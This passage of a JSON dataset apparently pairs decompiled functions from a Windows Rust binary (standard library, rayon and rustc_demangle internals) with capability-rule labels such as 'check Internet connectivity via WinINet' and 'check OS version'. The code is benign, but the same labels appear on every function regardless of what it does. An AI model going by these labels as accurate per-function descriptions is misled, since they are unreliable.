puVar9[uVar5 * 3 + 1] = uStack1624;\n            puVar9[uVar5 * 3 + 2] = uStack1616;\n            LOCK();\n            puVar9[uVar5 * 3 + 3] = puVar9[uVar5 * 3 + 3] | 1;\n            sym._ZN4core3ptr134drop_in_place_LT_core..option..Option_LT_alloc..boxed..Box_LT_crossbeam_deque..deque..Block_LT_rayon_core..job.\n                      (&uStack1640);\n            arg2 = puStack1632;\n        }\n    }\n    uVar4 = sym.rayon_core::sleep::counters::AtomicCounters::increment_jobs_event_counter_if::h500436e3248af3b4\n                      (arg1 + 0x2a);\n    if (((uVar4 & 0xffff) != 0) && ((1 < (uStack1608 ^ uStack1600) || ((uVar4 >> 0x10 & 0xffff) == (uVar4 & 0xffff)))))\n    {\n        iVar8 = 1;\n        uVar4 = arg1[0x29];\n        uVar5 = 0;\n        do {\n            if (uVar4 == uVar5) {\n                return;\n            }\n            uVar3 = uVar5 + 1;\n            uStack80 = 0x410658;\n            cVar2 = sym.rayon_core::sleep::Sleep::wake_specific_thread::h550424ba75ba2220(arg1 + 0x25, uVar5);\n            uVar5 = uVar3;\n        } while ((cVar2 == '\\0') || (iVar8 = iVar8 + -1,  iVar8 != 0));\n        return;\n    }\n    return;\n}\n",
        "token_count": 1443
    },
    "49b5ce43": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * sym.rayon_core::registry::Registry::in_worker_cold::LOCK_LATCH::__getit::h49b5ce437e8e4ca0(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    ulong *arg2;\n    int64_t iVar2;\n    uchar uVar3;\n    uchar uVar4;\n    int64_t iVar5;\n    uint uStack32;\n    ushort uStack28;\n    \n    // rayon_core::registry::Registry::in_worker_cold::LOCK_LATCH::__getit::h49b5ce437e8e4ca0\n    piVar1 = sym._ZN3std10sys_common16thread_local_key9StaticKey3get17heff87df9eba4a787E.198(0x443038);\n    if ((piVar1 < 0x2) || (*piVar1 == 0)) {\n        arg2 = sym._ZN3std10sys_common16thread_local_key9StaticKey3get17heff87df9eba4a787E.198(0x443038);\n        if (arg2 == 0x1) {\n            piVar1 = NULL;\n        }\n        else {\n            if (arg2 == NULL) {\n                arg2 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.184(0x28, 8);\n                *arg2 = 0;\n                arg2[4] = 0x443038;\n                sym._ZN3std10sys_common16thread_local_key9StaticKey3set17hb8e9483efec9e5adE.199(0x443038, arg2);\n            }\n            if ((arg1 == NULL) || (iVar2 = *arg1,  *arg1 = 0,  iVar2 != 1)) {\n                iVar5 = 0;\n                uVar3 = 0;\n                uVar4 = 0;\n                iVar2 = 0;\n            }\n            else {\n                iVar2 = arg1[1];\n                uVar4 = *(arg1 + 2);\n                uVar3 = *(arg1 + 0x11);\n                uStack28 = *(arg1 + 0x16);\n                uStack32 = *(arg1 + 0x12);\n                iVar5 = arg1[3];\n            }\n            *arg2 = 1;\n            piVar1 = arg2 + 1;\n            arg2[1] = iVar2;\n            *(arg2 + 2) = uVar4;\n            *(arg2 + 0x11) = uVar3;\n            *(arg2 + 0x12) = uStack32;\n            *(arg2 + 0x16) = uStack28;\n            arg2[3] = iVar5;\n        }\n    }\n    else {\n        piVar1 = piVar1 + 1;\n    }\n    return piVar1;\n}\n",
        "token_count": 640
    },
    "8314eef0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong sym.rustc_demangle::v0::Printer::print_sep_list::h8314eef081b30034(char *arg1)\n\n{\n    uint64_t uVar1;\n    char cVar2;\n    int64_t iVar3;\n    bool bVar4;\n    \n    // rustc_demangle::v0::Printer::print_sep_list::h8314eef081b30034\n    if (*arg1 == '\\0') {\n        iVar3 = 0;\n        do {\n            uVar1 = *(arg1 + 0x18);\n            if (((uVar1 < *(arg1 + 0x10)) && (*(arg1 + 8) != 0)) && (*(*(arg1 + 8) + uVar1) == 'E')) {\n                *(arg1 + 0x18) = uVar1 + 1;\n                return 0;\n            }\n            bVar4 = iVar3 != 0;\n            iVar3 = iVar3 + -1;\n            if ((((bVar4) && (*(arg1 + 0x28) != 0)) && (cVar2 = dbg.pad(*(arg1 + 0x28), 0x449096, 2),  cVar2 != '\\0'))\n               || (cVar2 = dbg.print_generic_arg(arg1),  cVar2 != '\\0')) {\n                return 1;\n            }\n        } while (*arg1 == '\\0');\n    }\n    return 0;\n}\n",
        "token_count": 317
    },
    "b9d39143": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym.rustc_demangle::v0::Parser::integer_62::hb9d39143c4471c86(uchar *arg1, int64_t *arg2)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    uchar uVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint8_t uVar7;\n    uint64_t uVar8;\n    \n    // rustc_demangle::v0::Parser::integer_62::hb9d39143c4471c86\n    iVar2 = *arg2;\n    uVar3 = arg2[1];\n    uVar8 = arg2[2];\n    if (((uVar8 < uVar3) && (iVar2 != 0)) && (*(iVar2 + uVar8) == '_')) {\n        arg2[2] = uVar8 + 1;\n        *(arg1 + 8) = 0;\ncode_r0x00414651:\n        uVar4 = 0;\n    }\n    else {\n        if ((iVar2 != 0) && (uVar8 < uVar3)) {\n            uVar6 = 0;\n            while( true ) {\n                uVar8 = uVar8 + 1;\n                cVar1 = *(iVar2 + -1 + uVar8);\n                if (cVar1 == '_') break;\n                uVar7 = cVar1 - 0x30;\n                if (9 < uVar7) {\n                    if (cVar1 + 0x9fU < 0x1a) {\n                        uVar7 = cVar1 + 0xa9;\n                    }\n                    else {\n                        if (0x19 < cVar1 + 0xbfU) goto code_r0x004146ed;\n                        uVar7 = cVar1 - 0x1d;\n                    }\n                }\n                arg2[2] = uVar8;\n                uVar5 = SUB168(ZEXT816(uVar6) * ZEXT816(0x3e), 0);\n                if (((SUB168(ZEXT816(uVar6) * ZEXT816(0x3e) >> 0x40, 0) != 0) ||\n                    (uVar6 = uVar5 + uVar7,  CARRY8(uVar5, uVar7))) || (uVar8 == uVar3)) goto code_r0x004146ed;\n            }\n            arg2[2] = uVar8;\n            if (uVar6 + 1 != 0) {\n                *(arg1 + 8) = uVar6 + 1;\n                goto code_r0x00414651;\n            }\n        }\ncode_r0x004146ed:\n        arg1[1] = 0;\n        uVar4 = 1;\n    }\n    *arg1 = uVar4;\n    return;\n}\n",
        "token_count": 634
    },
    "a85d2bde": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong sym.rustc_demangle::v0::Printer::print_sep_list::ha85d2bde7b8c62a5(char *arg1)\n\n{\n    uint64_t uVar1;\n    char cVar2;\n    int64_t iVar3;\n    \n    // rustc_demangle::v0::Printer::print_sep_list::ha85d2bde7b8c62a5\n    if (*arg1 == '\\0') {\n        iVar3 = 0;\n        do {\n            uVar1 = *(arg1 + 0x18);\n            if (((uVar1 < *(arg1 + 0x10)) && (*(arg1 + 8) != 0)) && (*(*(arg1 + 8) + uVar1) == 'E')) {\n                *(arg1 + 0x18) = uVar1 + 1;\n                return 0;\n            }\n            if ((((iVar3 != 0) && (*(arg1 + 0x28) != 0)) &&\n                (cVar2 = dbg.pad(*(arg1 + 0x28), 0x449096, 2),  cVar2 != '\\0')) ||\n               (cVar2 = dbg.print_type(arg1),  cVar2 != '\\0')) {\n                return 1;\n            }\n            iVar3 = iVar3 + 1;\n        } while (*arg1 == '\\0');\n    }\n    return 0;\n}\n",
        "token_count": 310
    },
    "eeba4ab5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t sym.std::sys_common::remutex::current_thread_unique_ptr::X::__getit::heeba4ab5a2f6977e(void)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    \n    // std::sys_common::remutex::current_thread_unique_ptr::X::__getit::heeba4ab5a2f6977e\n    iVar1 = *0x4430c8;\n    if (*0x4430c8 == 0) {\n        iVar1 = dbg.lazy_init(0x4430c8);\n    }\n    puVar2 = sub.KERNEL32.dll_TlsGetValue(iVar1);\n    if ((puVar2 < 0x2) || (*(puVar2 + 1) == '\\0')) {\n        iVar1 = *0x4430c8;\n        if (*0x4430c8 == 0) {\n            iVar1 = dbg.lazy_init(0x4430c8);\n        }\n        puVar2 = sub.KERNEL32.dll_TlsGetValue(iVar1);\n        if (puVar2 == 0x1) {\n            return 0;\n        }\n        if (puVar2 == NULL) {\n            puVar2 = sym.__rust_alloc(0x10, 8);\n            if (puVar2 == NULL) {\n                dbg.handle_alloc_error(0x10);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            *(puVar2 + 1) = 0;\n            *puVar2 = 0x4430c8;\n            iVar1 = *0x4430c8;\n            if (*0x4430c8 == 0) {\n                iVar1 = dbg.lazy_init(0x4430c8);\n            }\n            sub.KERNEL32.dll_TlsSetValue(iVar1, puVar2);\n        }\n        *(puVar2 + 1) = 1;\n    }\n    return puVar2 + 9;\n}\n",
        "token_count": 427
    },
    "9f8e69e6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym._ZN4core3ptr95drop_in_place_LT_std..io..buffered..linewriter..LineWriter_LT_std..io..stdio..StdoutRaw_GT__GT_17h9f8e69e6c3192f\n               (ulong *arg1)\n\n{\n    int64_t arg1_00;\n    \n    if ((*(arg1 + 0x1d) == '\\0') && (arg1_00 = dbg.flush_buf<std::io::stdio::StdoutRaw>(arg1),  arg1_00 != 0)) {\n        dbg.drop_in_place<std::io::error::Error>(arg1_00);\n    }\n    if (arg1[1] == 0) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *arg1);\n    return;\n}\n",
        "token_count": 240
    },
    "347b2bf3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym.std::sys::windows::stdio::write::h347b2bf3c3c6597f\n               (uchar (*arg1) [16], ulong nStdHandle, uint8_t *arg3, uint64_t arg4)\n\n{\n    code *pcVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong **arg1_00;\n    ulong *puVar6;\n    ulong arg4_00;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint8_t *in_stack_00000028;\n    uint uStack184;\n    uchar uStack180;\n    ulong *puStack176;\n    ulong uStack168;\n    ulong *puStack160;\n    ulong uStack152;\n    char *pcStack136;\n    ulong uStack128;\n    ulong *puStack120;\n    code *pcStack112;\n    ulong *puStack104;\n    uint uStack96;\n    uint uStack92;\n    int64_t iStack88;\n    uint64_t uStack80;\n    ulong *puStack72;\n    ulong **ppuStack56;\n    ulong uStack48;\n    \n    // std::sys::windows::stdio::write::h347b2bf3c3c6597f\n    if (arg4 != 0) {\n        iVar4 = sub.KERNEL32.dll_GetStdHandle(nStdHandle);\n        if (iVar4 == 0) {\n            uVar5 = 0x600000002;\n        }\n        else if (iVar4 == -1) {\n            iVar4 = sub.KERNEL32.dll_GetLastError();\n            uVar5 = iVar4 << 0x20 | 2;\n        }\n        else {\n            uStack168 = uStack168._4_4_ << 0x20;\n            puStack120 = &uStack168;\n            iVar3 = sub.KERNEL32.dll_GetConsoleMode();\n            if (iVar3 == 0) {\n                puStack104 = CONCAT44(*0x4444a4, *0x4444a0);\n                uStack96 = *0x4444a8;\n                uStack92 = *0x4444ac;\n                uVar7 = 0xffffffff;\n                if (arg4 < 0xffffffff) {\n                    uVar7 = arg4;\n                }\n                puStack104._0_4_ = (**0x4430a0)(iVar4, 0, 0, 0, &puStack104, arg3, uVar7, ZEXT816(0));\n                if (puStack104 == 0x103) {\n                    sub.KERNEL32.dll_WaitForSingleObject(iVar4, 0xffffffff);\n                    if (puStack104 == 0x103) {\n                        uStack180 = 0;\n                        uStack184 = 0;\n                        uStack168 = 0x44b200;\n                        puStack160 = 0x1;\n                        uStack152 = 0;\n                        pcStack136 = \n                        \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                        ;\n                        uStack128 = 0;\n                        pcStack112 = sym._core::fmt::Arguments_as_core::fmt::Display_::fmt::h4e5384f2a3114011;\n                        iStack88 = 0x449cf0;\n                        uStack80 = 2;\n                        puStack72 = NULL;\n                        ppuStack56 = &puStack120;\n                        uStack48 = 1;\n                        puStack176 = sym.std::io::Write::write_fmt::h5b49514cbac34265(&uStack184, &iStack88);\n                        sym.core::ptr::drop_in_place_core::result::Result____std::io::error::Error__::h55356aaae92f6e32\n                                  (&puStack176);\n                        pcVar1 = swi(0x29);\n                        (*pcVar1)(7);\n                        do {\n                            invalidInstructionException();\n                        } while( true );\n                    }\n                }\n                if (puStack104 < 0) {\n                    iVar4 = (**0x4430a8)(puStack104);\n                    uVar5 = iVar4 << 0x20 | 2;\n                }\n                else {\n                    uVar5 = CONCAT44(uStack92, uStack96);\n                }\n                **arg1 = puStack104 < 0;\n                *(*arg1 + 8) = uVar5;\n                return;\n            }\n            uVar2 = in_stack_00000028[4];\n            if (uVar2 == 0) {\n                uVar5 = 0x1000;\n                if (arg4 < 0x1000) {\n                    uVar5 = arg4;\n                }\n                dbg.from_utf8(&iStack88, arg3, uVar5);\n                if (iStack88 != 0) {\n                    if (uStack80 == 0) {\n                        uVar5 = *(*arg3 + 0x449579);\n                        if ((1 < uVar5) && (arg4 < uVar5)) {\n                            *in_stack_00000028 = *arg3;\n                            in_stack_00000028[4] = 1;\ncode_r0x0041b577:\n                            *(*arg1 + 8) = 1;\n                            **arg1 = 0;\n                            return;\n                        }\n                        puStack160 = 0x44b7a8;\ncode_r0x0041b548:\n                        *(*arg1 + 8) = puStack160;\n                        **arg1 = 1;\n                        return;\n                    }\n                    if (arg4 < uStack80) {\n                        dbg.slice_end_index_len_fail(uStack80, arg4);\n                        do {\n                            invalidInstructionException();\n                        } while( true );\n                    }\n                    dbg.from_utf8(&uStack168, arg3, uStack80);\n                    dbg.unwrap<&str, core::str::error::Utf8Error>(&uStack168);\n                }\n                dbg.write_valid_utf8_to_console(arg1);\n                return;\n            }\n            if (3 < uVar2) {\n                uStack168 = 0x44b730;\n                puStack160 = 0x1;\n                uStack152 = 0;\n                pcStack136 = \n                \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                ;\n                uStack128 = 0;\n                dbg.panic_fmt(&uStack168, 0x44b740);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            if ((*arg3 & 0xc0) == 0x80) {\n                in_stack_00000028[uVar2] = *arg3;\n                uVar2 = in_stack_00000028[4] + 1;\n                in_stack_00000028[4] = uVar2;\n                puVar6 = *(*in_stack_00000028 + 0x449579);\n                uVar7 = *0x444490;\n                uVar8 = *0x444494;\n                uVar9 = *0x444498;\n                uVar10 = *0x44449c;\n                if (uVar2 < *(*in_stack_00000028 + 0x449579)) goto code_r0x0041b2b6;\n                puStack176 = puVar6;\n                if (4 < uVar2) {\n                    dbg.slice_end_index_len_fail(uVar2, 4);\n                    do {\n                        invalidInstructionException();\n                    } while( true );\n                }\n                dbg.from_utf8(&iStack88, in_stack_00000028, uVar2);\n                in_stack_00000028[4] = 0;\n                if (iStack88 == 0) {\n                    puStack120 = puStack72;\n                    if (puStack72 == puVar6) {\n                        dbg.write_valid_utf8_to_console(&uStack168);\n                        if (uStack168 != 0) goto code_r0x0041b548;\n                        puStack104 = puStack160;\n                        if (puStack160 == puVar6) goto code_r0x0041b577;\n                        arg4_00 = 0x44b7d8;\n                        arg1_00 = &puStack104;\n                        puStack120 = puVar6;\n                    }\n                    else {\n                        arg4_00 = 0x44b7c0;\n                        arg1_00 = &puStack176;\n                    }\n                    uStack168 = 0;\n                    dbg.assert_failed<usize, usize>(arg1_00, &puStack120, &uStack168, arg4_00);\n                    do {\n                        invalidInstructionException();\n                    } while( true );\n                }\n            }\n            else {\n                in_stack_00000028[4] = 0;\n            }\n            uVar5 = 0x44b7a8;\n        }\n        *(*arg1 + 8) = uVar5;\n        **arg1 = 1;\n        return;\n    }\n    uVar7 = 0;\n    uVar8 = 0;\n    uVar9 = 0;\n    uVar10 = 0;\ncode_r0x0041b2b6:\n    *arg1 = CONCAT412(uVar10, CONCAT48(uVar9, CONCAT44(uVar8, uVar7)));\n    return;\n}\n",
        "token_count": 2111
    },
    "a765fe93": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * sym.std::panicking::panic_count::LOCAL_PANIC_COUNT::__getit::ha765fe93b4f886d0(void)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    \n    // std::panicking::panic_count::LOCAL_PANIC_COUNT::__getit::ha765fe93b4f886d0\n    iVar1 = *0x4430e8;\n    if (*0x4430e8 == 0) {\n        iVar1 = dbg.lazy_init(0x4430e8);\n    }\n    piVar2 = sub.KERNEL32.dll_TlsGetValue(iVar1);\n    if ((piVar2 < 0x2) || (*piVar2 == 0)) {\n        iVar1 = *0x4430e8;\n        if (*0x4430e8 == 0) {\n            iVar1 = dbg.lazy_init(0x4430e8);\n        }\n        piVar2 = sub.KERNEL32.dll_TlsGetValue(iVar1);\n        if (piVar2 == NULL) {\n            piVar2 = sym.__rust_alloc(0x18, 8);\n            if (piVar2 == NULL) {\n                dbg.handle_alloc_error(0x18);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            *piVar2 = 0;\n            piVar2[2] = 0x4430e8;\n            iVar1 = *0x4430e8;\n            if (*0x4430e8 == 0) {\n                iVar1 = dbg.lazy_init(0x4430e8);\n            }\n            sub.KERNEL32.dll_TlsSetValue(iVar1, piVar2);\n        }\n        else if (piVar2 == 0x1) {\n            return NULL;\n        }\n        *piVar2 = 1;\n        piVar2[1] = 0;\n    }\n    return piVar2 + 1;\n}\n",
        "token_count": 427
    },
    "f4e98b50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * sym.std::sys_common::thread_info::THREAD_INFO::__getit::hf4e98b50bd193870(void)\n\n{\n    int64_t *arg1;\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    \n    // std::sys_common::thread_info::THREAD_INFO::__getit::hf4e98b50bd193870\n    iVar1 = *0x4430d8;\n    if (*0x4430d8 == 0) {\n        iVar1 = dbg.lazy_init(0x4430d8);\n    }\n    piVar2 = sub.KERNEL32.dll_TlsGetValue(iVar1);\n    if ((piVar2 < 0x2) || (*piVar2 == 0)) {\n        iVar1 = *0x4430d8;\n        if (*0x4430d8 == 0) {\n            iVar1 = dbg.lazy_init(0x4430d8);\n        }\n        piVar3 = sub.KERNEL32.dll_TlsGetValue(iVar1);\n        if (piVar3 == NULL) {\n            piVar3 = sym.__rust_alloc(0x20, 8);\n            if (piVar3 == NULL) {\n                dbg.handle_alloc_error(0x20);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            *piVar3 = 0;\n            piVar3[3] = 0x4430d8;\n            iVar1 = *0x4430d8;\n            if (*0x4430d8 == 0) {\n                iVar1 = dbg.lazy_init(0x4430d8);\n            }\n            sub.KERNEL32.dll_TlsSetValue(iVar1, piVar3);\n        }\n        else if (piVar3 == 0x1) {\n            return NULL;\n        }\n        piVar2 = piVar3 + 1;\n        iVar1 = *piVar3;\n        arg1 = piVar3[2];\n        *piVar3 = 1;\n        *(piVar3 + 1) = ZEXT816(0);\n        if ((iVar1 != 0) && (arg1 != NULL)) {\n            LOCK();\n            *arg1 = *arg1 + -1;\n            if (*arg1 == 0) {\n                dbg.drop_slow<std::thread::Inner>(arg1);\n            }\n        }\n    }\n    else {\n        piVar2 = piVar2 + 1;\n    }\n    return piVar2;\n}\n",
        "token_count": 545
    },
    "3d8599af": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.std::thread::current::h3d8599afe262ad96(ulong param_1, ulong param_2)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    uchar auStack24 [8];\n    \n    // std::thread::current::h3d8599afe262ad96\n    piVar2 = sym.std::sys_common::thread_info::THREAD_INFO::__getit::hf4e98b50bd193870();\n    if (piVar2 != NULL) {\n        if (*piVar2 != 0) {\n            dbg.unwrap_failed(str.already_borrowed, 0x10, auStack24, 0x449888);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        *piVar2 = -1;\n        piVar3 = piVar2[1];\n        if (piVar3 == NULL) {\n            piVar3 = sym.std::thread::Thread::new::ha66c84edb9e6189d(0, param_2);\n            piVar2[1] = piVar3;\n        }\n        LOCK();\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + 1;\n        if (*piVar3 == 0 || SCARRY8(iVar1, 1) != *piVar3 < 0) {\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        *piVar2 = *piVar2 + 1;\n        if (piVar3 != NULL) {\n            return;\n        }\n    }\n    dbg.expect_failed(0x449e4d, 0x5e, 0x449eb0);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 393
    },
    "3973e80b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong sym._std::backtrace_rs::symbolize::SymbolName_as_core::fmt::Display_::fmt::h3973e80b35cf58f1\n                (int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    ulong uVar3;\n    code *pcVar4;\n    uint64_t arg3;\n    uint64_t uVar5;\n    int64_t arg2_00;\n    uint *puStack168;\n    int64_t iStack160;\n    int64_t iStack152;\n    uint64_t uStack144;\n    ulong uStack136;\n    int64_t ***pppiStack128;\n    ulong uStack120;\n    int64_t *piStack112;\n    int64_t **ppiStack104;\n    code *pcStack96;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    int64_t iStack72;\n    \n    // <std::backtrace_rs::symbolize::SymbolName as core::fmt::Display>::fmt::h3973e80b35cf58f1\n    if (arg1[2] == 3) {\n        arg3 = arg1[1];\n        if (arg3 != 0) {\n            arg2_00 = *arg1;\n            do {\n                dbg.from_utf8(&iStack160, arg2_00, arg3);\n                iVar1 = iStack152;\n                if (iStack160 == 0) {\n                    cVar2 = dbg.pad(arg2, iStack152, uStack144);\n                    if (cVar2 == '\\0') {\n                        return 0;\n                    }\n                    goto code_r0x0041d05d;\n                }\n                uVar5 = uStack144 >> 8;\n                cVar2 = dbg.pad(arg2, \"\ufffdmemory allocation of  bytes failed\\n\", 3);\n                if (cVar2 != '\\0') goto code_r0x0041d05d;\n                if (uStack144 == '\\0') {\n                    return 0;\n                }\n                uVar5 = iVar1 + (uVar5 & 0xff);\n                if (arg3 < uVar5) {\n                    dbg.slice_start_index_len_fail(uVar5, arg3);\n                    do {\n                        invalidInstructionException();\n                    } while( true );\n                }\n                arg2_00 = arg2_00 + uVar5;\n                arg3 = arg3 - uVar5;\n            } while (arg3 != 0);\n        }\n        return 0;\n    }\n    if (arg1[2] == 2) {\n        uVar3 = *(arg2 + 0x20);\n        pcVar4 = *(*(arg2 + 0x28) + 0x18);\n        cVar2 = (*pcVar4)(uVar3, arg1[6], arg1[7]);\n        if (cVar2 != '\\0') {\n            return 1;\n        }\ncode_r0x0041d038:\n        uVar3 = (*pcVar4)(uVar3, arg1[8], arg1[9]);\n    }\n    else {\n        piStack112 = arg1 + 2;\n        uStack88 = *0x4444b0;\n        uStack84 = *0x4444b4;\n        uStack80 = *0x4444b8;\n        uStack76 = *0x4444bc;\n        ppiStack104 = &piStack112;\n        if ((*(arg2 + 0x30) & 4) == 0) {\n            uStack144 = 0;\n        }\n        else {\n            uStack144 = 0x449f40;\n            uStack136 = 1;\n        }\n        puStack168 = &uStack88;\n        pcStack96 = dbg.fmt<rustc_demangle::DemangleStyle>;\n        iStack152 = 1;\n        iStack160 = 0x449f88;\n        pppiStack128 = &ppiStack104;\n        uStack120 = 1;\n        iStack72 = arg2;\n        cVar2 = dbg.write(&puStack168, 0x448bd0, &iStack160);\n        if ((CONCAT44(uStack84, uStack88) == 0) || (cVar2 == '\\0')) {\n            if (cVar2 == '\\0') {\n                if (CONCAT44(uStack84, uStack88) != 0) {\n                    dbg.unwrap_failed(0x449193, 0x37, &iStack160, 0x448ca8);\n                    do {\n                        invalidInstructionException();\n                    } while( true );\n                }\n                goto code_r0x0041d02a;\n            }\n        }\n        else {\n            cVar2 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), \"{size limit reached}SizeLimitExhausted\", 0x14);\n            if (cVar2 == '\\0') {\ncode_r0x0041d02a:\n                uVar3 = *(arg2 + 0x20);\n                pcVar4 = *(*(arg2 + 0x28) + 0x18);\n                goto code_r0x0041d038;\n            }\n        }\ncode_r0x0041d05d:\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 1191
    },
    "14975639": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym._std::path::Components_as_core::iter::traits::iterator::Iterator_::next::h149756394580f2c6\n               (int64_t *arg1, char **arg2, ulong noname_2, uint64_t arg4)\n\n{\n    uint8_t uVar1;\n    char *pcVar2;\n    char cVar3;\n    char **arg1_00;\n    char **arg2_00;\n    ulong unaff_RBX;\n    char *pcVar4;\n    ulong unaff_RBP;\n    int64_t iVar5;\n    char **ppcVar6;\n    ulong unaff_RDI;\n    uint64_t noname_3;\n    char **ppcVar7;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    unkbyte7 in_stack_ffffffffffffffb8;\n    \n    // <std::path::Components as core::iter::traits::iterator::Iterator>::next::h149756394580f2c6\n    uVar8 = *(arg2 + 0x39);\n    if (((uVar8 == 3) || (uVar9 = *(arg2 + 0x3a),  uVar9 == 3)) || (uVar9 < uVar8)) {\ncode_r0x0041e43e:\n        *arg1 = 5;\n        return;\n    }\n    uVar1 = *(arg2 + 2);\n    noname_3 = arg4 & 0xffffffffffffff00 | *(arg2 + 7);\n    arg2_00 = arg2;\n    ppcVar7 = NULL;\n    if (uVar1 != 6) {\n        ppcVar7 = arg2 + 2;\n    }\ncode_r0x0041e24e:\n    if (uVar8 == 0) {\n        if (uVar1 != 6) {\n    // WARNING: Could not recover jumptable at 0x0041e2e6. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (7 cases) at 0x41e5c8\n            (*(*(*ppcVar7 * 4 + 0x41e5c8) + 0x41e5c8))();\n            return;\n        }\n        *(arg2 + 0x39) = 1;\n        uVar8 = 1;\n        goto code_r0x0041e245;\n    }\n    if (uVar8 == 1) {\n        *(arg2 + 0x39) = 2;\n        if (noname_3 != '\\0') {\n            if (arg2[1] == NULL) {\ncode_r0x0041e5a9:\n                dbg.slice_start_index_len_fail(1, 0);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            *arg2 = *arg2 + 1;\n            arg2[1] = arg2[1] + -1;\ncode_r0x0041e431:\n            *arg1 = 1;\n            return;\n        }\n        uVar8 = 2;\n        if ((2 < uVar1) && (uVar8 = 2,  uVar1 != 5)) {\n            if (uVar1 != 6) goto code_r0x0041e431;\n            cVar3 = dbg.include_cur_dir(arg2, arg2_00, 